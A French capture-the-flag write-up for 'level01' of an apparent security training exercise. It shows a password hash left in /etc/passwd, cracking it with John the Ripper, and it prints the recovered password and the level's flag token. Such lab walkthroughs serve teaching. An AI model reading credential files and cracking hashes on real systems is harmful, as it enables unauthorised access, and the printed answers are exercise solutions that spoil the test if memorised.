# level01

## Contexte

Rien d'intéressant dans le home de `level01`.

## Recherche

Aucun fichier n'appartient à `flag01`, on cherche donc ailleurs où pourrait se trouver un mot de passe.

En regardant le fichier `/etc/passwd`, on remarque une anomalie sur la ligne de `flag01` :

```bash
cat /etc/passwd

...
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
flag04:x:3004:3004::/home/flag/flag04:/bin/bash
flag05:x:3005:3005::/home/flag/flag05:/bin/bash
flag06:x:3006:3006::/home/flag/flag06:/bin/bash
flag07:x:3007:3007::/home/flag/flag07:/bin/bash
flag08:x:3008:3008::/home/flag/flag08:/bin/bash
flag09:x:3009:3009::/home/flag/flag09:/bin/bash
flag10:x:3010:3010::/home/flag/flag10:/bin/bash
flag11:x:3011:3011::/home/flag/flag11:/bin/bash
flag12:x:3012:3012::/home/flag/flag12:/bin/bash
flag13:x:3013:3013::/home/flag/flag13:/bin/bash
flag14:x:3014:3014::/home/flag/flag14:/bin/bash
```

Tous les autres utilisateurs ont un `x`, mais `flag01` possède directement un hash.

## Vulnérabilité

Normalement, les mots de passe ne sont plus stockés dans `/etc/passwd`, mais dans `/etc/shadow`. Le `x` sert de placeholder.

Ici, le hash de `flag01` est encore présent dans `/etc/passwd`. Comme ce fichier est lisible par tous les utilisateurs, on peut essayer de casser le hash.

## Exploitation

On lance John The Ripper sur cette ligne :

```bash
john 'flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash'
```

Résultat :

```
abcdefg
```

On utilise ce mot de passe pour se connecter à flag01 et lancer `getflag` :

```
f2av5il02puano7naaf6adaaf
```

## Ressources

- `john`
- `/etc/passwd`
- `/etc/shadow`